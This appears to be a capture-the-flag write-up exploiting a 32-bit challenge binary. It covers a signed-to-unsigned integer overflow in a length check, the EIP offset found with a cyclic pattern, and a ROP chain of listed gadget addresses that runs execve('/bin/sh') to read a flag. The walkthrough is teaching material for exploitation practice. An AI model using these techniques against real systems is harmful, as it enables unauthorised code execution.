# Exploitation in four steps

## Step 1 : Binary analysis

#### int main(int ac, char **av)

- the binary reserves two 512-bytes buffers on the stack and zeroes out their contents
- it asks the user how long is its name, then reads 500 characters into the first buffer
- it asks the user what is its name, then reads 500 characters into the second buffer
- it calls atoi on the first buffer and stores the result in an int
- if the result is less than 16, it calls the greet function with the second buffer as the first parameter and the atoi result \* 4 as the second parameter
- otherwise, it prints that the size is too long and exits

#### int greet(buf2, size)

- reserves a 64 bytes-long buffer on the stack
- writes a null byte at the end of it
- does a memcpy from buf2 to the 64-bytes buffer with size as a third argument
- greets the user with "Hello" followed by the user's name (taken from the 64-bytes buffer)
- returns to main

## Step 2 : integer overflow from int to size_t

The binary will not copy more than 15 \* 4 = 60 bytes from argv[2] to the buffer. This can however be bypassed, as atoi returns a signed int and memcpy takes a size_t (unsigned int)

Which means we can make the memcpy write past the buffer if we give it an input of INT_MIN + payload_size / 4

## Step 3 : Overwriting EIP

We're going to write ~60 chars past the buffer, this should be enough to overwrite anything.

The first parameter is going to be INT_MIN + 120 / 4 = -2147483648 + 30 = -2147483618

```
$ cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
$ pwndbg ./pwn1
How long is your name ?
-2147483618
And what is your name ?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
Program received signal SIGSEGV, Segmentation fault.
[...]
EIP = 0x74616161 (-> 'taaa')
> cyclic -l taaa
Finding cyclic pattern of 4 bytes: b'taaa' (hex: 0x74616161)
Found at offset 76
```

We need to write 76 chars to overwrite EIP.

A quick checksec on the binary :

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We don't know if ASLR is enabled on the remote server and the stack is not executable : this calls for a ROPchain.

## Step 4 : building the ROPchain

We have enough information now to know what our exploit is going to look like : 76 bytes of padding followed by our ROPchain.

Our ROPchain's structure is going to be :

- Find the address of a writable segment (like .data)
- Write /bin/sh in it and null terminate it
- Push this address to EBP
- Push 0 to ECX
- syscall execve (which means putting the corresponding syscall number in EAX and calling it by executing an int 0x80 instruction)

In 32-bits, execve's call number is 11 as per https://syscalls.w3challs.com/?arch=x86, which means we will to put 11 in eax before the syscall, either by repeating an inc gadget or finding the corresponding add or mov gadget.

We have the binary so we can extract the gadgets with ROPgadget. We primarily need the basics of a ROPchain ("pop <registers> ; ret" - "int 0x80" - "xor eax, eax ; ret" and a write-what-where)

```
$ ROPgadget --binary pwn1 > gadgets.txt
$ cat gadgets.txt | grep ret | grep 'pop eax'
[...]
0x08052a48 : pop eax ; ret
[...]
```

We have our first gadget, now we need to repeat the process until we have enough to build the full ROPchain.

The write-what-where gives us a little headache as we can't find a proper gadget, but we can get around it by using an xchg instruction to swap the registers' content.

The final gadget list is going to look like this :

```
    0x080a71ab # xchg edx, eax ; ret
    0x0804901e # pop ebx ; ret
    0x080647f4 # pop ecx ; add al, 0xf6 ; ret
    0x0805f80a # mov dword ptr [edx], eax ; ret
    0x08070254 # mov dword ptr [eax], edx ; ret
    0x08052a48 # pop eax ; ret
    0x0805aae5 # xor edx, edx ; mov eax, edx ; ret
    0x08057b80 # xor eax, eax ; ret
    0x08086c09 # nop ; inc eax ; ret
    0x08049c02 # int 0x80
```

We're also going to need an address in the .data segment (writable) to store the "/bin/sh" string that system is going to take as an argument.

```
$ readelf -S pwn1 | grep " .data "
[18] .data             PROGBITS        080ec000 0a3000 000e9c 00  WA  0   0 32
So we have :
    0x080ec000 # .data start
    0x080ec004 # .data + 4
Let's also get the /bin/sh string as hex (in little endian) while we're at it and null-terminate it (Cyberchef does wonders here):
    0x6e69622f # "/bin"
    0x0068732f # "/sh\0"
```

Now we're all set. The full ROPchain can be found in the `exploit.py` script, along with some pwntools magic to put it together.

## Step 5 : profit

```
./exploit.py 
[+] Starting local process './pwn1': pid 358287
[*] Switching to interactive mode
$ cat flag.txt
C0ngr4tz!!!
``` 